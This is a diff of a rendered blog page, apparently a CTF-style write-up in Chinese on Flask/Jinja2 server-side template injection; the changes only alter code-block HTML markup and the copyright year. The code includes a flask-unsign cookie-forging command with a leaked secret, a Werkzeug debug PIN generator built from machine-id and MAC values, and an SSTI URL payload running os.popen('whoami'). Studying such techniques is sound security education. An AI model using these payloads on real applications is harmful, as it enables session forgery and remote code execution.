@@ -173,8 +173,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="vm">__class__</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="o">.</span><span class="vm">__class__</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -221,11 +221,11 @@
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{%...%} 语句 (Statements)
-{{...}} 打印模板输出的表达式 (Expressions)
-{{#...#}} 注释
-#...## 行注释 (Line Statements)
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%...%} 语句 (Statements)
+</span></span><span class="line"><span class="cl">{{...}} 打印模板输出的表达式 (Expressions)
+</span></span><span class="line"><span class="cl">{{#...#}} 注释
+</span></span><span class="line"><span class="cl">#...## 行注释 (Line Statements)
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="ssti">SSTI</h3>
 <blockquote>
@@ -288,8 +288,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">flask-unsign --sign --cookie <span class="s2">&#34;{&#39;balance&#39;: 6666}&#34;</span> --secret <span class="s2">&#34;7xrQRfVWmTHMRzwGXLhCQrECTqLndq1ODnvvDjKZ&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">flask-unsign --sign --cookie <span class="s2">&#34;{&#39;balance&#39;: 6666}&#34;</span> --secret <span class="s2">&#34;7xrQRfVWmTHMRzwGXLhCQrECTqLndq1ODnvvDjKZ&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -365,47 +365,47 @@
 </span><span class="lnt">40
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
-<span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
-    <span class="s1">&#39;root&#39;</span><span class="p">,</span><span class="c1"># username</span>
-    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span><span class="c1"># modname</span>
-    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span><span class="c1"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
-    <span class="s1">&#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39;</span> <span class="c1"># getattr(mod, &#39;__file__&#39;, None),</span>
-<span class="p">]</span>
-
-<span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
-    <span class="s1">&#39;345051575547&#39;</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/eth0/address</span>
-    <span class="s1">&#39;613cacd3857f425e9409e544dece08da&#39;</span><span class="p">,</span> <span class="c1"># get_machine_id(), /etc/machine-id</span>
-<span class="p">]</span>
-
-<span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
-<span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
-    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
-        <span class="k">continue</span>
-    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
-        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
-    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
-<span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
-
-<span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
-
-<span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
-<span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
-    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
-    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
-
-<span class="n">rv</span> <span class="o">=</span><span class="kc">None</span>
-<span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
-    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
-        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
-                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
-            <span class="k">break</span>
-    <span class="k">else</span><span class="p">:</span>
-        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
-
-<span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">itertools</span> <span class="kn">import</span> <span class="n">chain</span>
+</span></span><span class="line"><span class="cl"><span class="n">probably_public_bits</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;root&#39;</span><span class="p">,</span><span class="c1"># username</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;flask.app&#39;</span><span class="p">,</span><span class="c1"># modname</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;Flask&#39;</span><span class="p">,</span><span class="c1"># getattr(app, &#39;__name__&#39;, getattr(app.__class__, &#39;__name__&#39;))</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;/usr/local/lib/python3.8/site-packages/flask/app.py&#39;</span> <span class="c1"># getattr(mod, &#39;__file__&#39;, None),</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">private_bits</span> <span class="o">=</span> <span class="p">[</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;345051575547&#39;</span><span class="c1"># str(uuid.getnode()),  /sys/class/net/eth0/address</span>
+</span></span><span class="line"><span class="cl">    <span class="s1">&#39;613cacd3857f425e9409e544dece08da&#39;</span><span class="p">,</span> <span class="c1"># get_machine_id(), /etc/machine-id</span>
+</span></span><span class="line"><span class="cl"><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">bit</span> <span class="ow">in</span> <span class="n">chain</span><span class="p">(</span><span class="n">probably_public_bits</span><span class="p">,</span> <span class="n">private_bits</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="ow">not</span> <span class="n">bit</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">continue</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">bit</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bit</span> <span class="o">=</span> <span class="n">bit</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">bit</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;cookiesalt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">cookie_name</span> <span class="o">=</span> <span class="s1">&#39;__wzd&#39;</span> <span class="o">+</span> <span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()[:</span><span class="mi">20</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">num</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">num</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;pinsalt&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">num</span> <span class="o">=</span> <span class="p">(</span><span class="s1">&#39;</span><span class="si">%09d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="nb">int</span><span class="p">(</span><span class="n">h</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">(),</span> <span class="mi">16</span><span class="p">))[:</span><span class="mi">9</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">rv</span> <span class="o">=</span><span class="kc">None</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">rv</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">group_size</span> <span class="ow">in</span> <span class="mi">5</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">3</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">)</span> <span class="o">%</span> <span class="n">group_size</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">rv</span> <span class="o">=</span> <span class="s1">&#39;-&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">num</span><span class="p">[</span><span class="n">x</span><span class="p">:</span><span class="n">x</span> <span class="o">+</span> <span class="n">group_size</span><span class="p">]</span><span class="o">.</span><span class="n">rjust</span><span class="p">(</span><span class="n">group_size</span><span class="p">,</span> <span class="s1">&#39;0&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">                          <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">num</span><span class="p">),</span> <span class="n">group_size</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">rv</span> <span class="o">=</span> <span class="n">num</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">rv</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h4 id="脚本中-6-个参数的获取方法">脚本中 6 个参数的获取方法：</h4>
 <h5 id="username">username</h5>
@@ -423,8 +423,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="nb">int</span><span class="p">(</span><span class="s2">&#34;02:42:ac:13:00:02&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">int</span><span class="p">(</span><span class="s2">&#34;02:42:ac:13:00:02&#34;</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s2">&#34;:&#34;</span><span class="p">,</span> <span class="s2">&#34;&#34;</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -478,10 +478,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">{%for i in range(10)%}
-{%print(i)%}
-{%endfor%}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%for i in range(10)%}
+</span></span><span class="line"><span class="cl">{%print(i)%}
+</span></span><span class="line"><span class="cl">{%endfor%}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -501,8 +501,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">http://127.0.0.1:8345/hello?name=\{\{%22%22.__class__.__base__.__subclasses__()[302].__init__.__globals__[%27os%27].popen(%22whoami%22).read()\}\}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">http://127.0.0.1:8345/hello?name=\{\{%22%22.__class__.__base__.__subclasses__()[302].__init__.__globals__[%27os%27].popen(%22whoami%22).read()\}\}
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -540,7 +540,7 @@
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
